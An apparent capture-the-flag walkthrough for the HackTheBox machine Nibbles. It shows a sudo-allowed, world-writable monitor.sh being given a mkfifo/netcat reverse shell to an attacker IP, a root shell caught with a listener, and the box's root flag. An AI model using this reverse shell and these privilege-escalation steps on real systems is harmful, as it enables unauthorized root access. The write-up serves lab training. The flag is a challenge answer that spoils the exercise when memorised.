### Walkthrough: Privilege Escalation on HTB Box Nibbles
- #### **1. Extracting and Analyzing `personal.zip`**
	- **Command**:
    ```bash
    unzip personal.zip
    ```
- **Contents**:
    - A directory structure: `personal/stuff/monitor.sh`.
    - **`monitor.sh` Analysis**:
        - A monitoring script owned by `nibbler`.
        - Script is **world-writable**.
- #### **2. Enumerating for Privilege Escalation**
	- **Tool**: LinEnum.sh
	    - Download LinEnum:
        ```bash
        wget http://<your-attack-ip>:8080/LinEnum.sh
        ```
	    - Make executable:
        ```bash
        chmod +x LinEnum.sh
        ```
	    - Execute:
        ```bash
        ./LinEnum.sh
        ```
- **Key Findings**:
    - **Sudo Privileges**:
        ```plaintext
        User nibbler may run the following commands on Nibbles:
            (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
        ```
    - `nibbler` can execute `monitor.sh` as root without a password.
- #### **3. Crafting a Privilege Escalation Payload**
	- **Plan**:
	    - Append a reverse shell payload to `monitor.sh`.
	    - Execute the script with `sudo`.
	    - Catch the root shell on the attacker's listener.
	- **Payload**:
    ```bash
    rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <your-attack-ip> 8443 >/tmp/f
    ```
    - Replace `<your-attack-ip>` with your attacking machine's IP.
- **Append Payload to `monitor.sh`**:
    ```bash
    echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.2 8443 >/tmp/f' | tee -a /home/nibbler/personal/stuff/monitor.sh
    ```
- #### **4. Executing the Script with Sudo**
	- **Command**:
    ```bash
    sudo /home/nibbler/personal/stuff/monitor.sh
    ```
- #### **5. Catching the Root Shell**
	- **Set Up Listener**:
    ```bash
    nc -lvnp 8443
    ```
- **Listener Output**:
    ```plaintext
    listening on [any] 8443 ...
    connect to [10.10.14.2] from (UNKNOWN) [10.129.42.190] 47488
    # id
    uid=0(root) gid=0(root) groups=0(root)
    ```
- #### **6. Capturing the Root Flag**
	- **Navigate to `/root`**:
    ```bash
    cd /root
    ```
	- **View `root.txt`**:
    ```bash
    cat root.txt
    ```
    


### **Key Takeaways**
1. **Privilege Escalation Lessons**:
    - Identify writable files with elevated privileges.
    - Modify scripts cautiously by appending payloads to avoid breaking functionality.
2. **Post-Exploitation Tasks**:
    - Always take detailed notes.
    - Explore alternate methods to achieve similar results for practice.
3. **Replication**:
    - Attempt the box again to reinforce understanding.
    - Explore different tools for enumeration, exploitation, and privilege escalation.



### Questions
- Escalate privileges and submit the root.txt flag.
	- de5e5d6619862a8aa5b9b212314e0cdd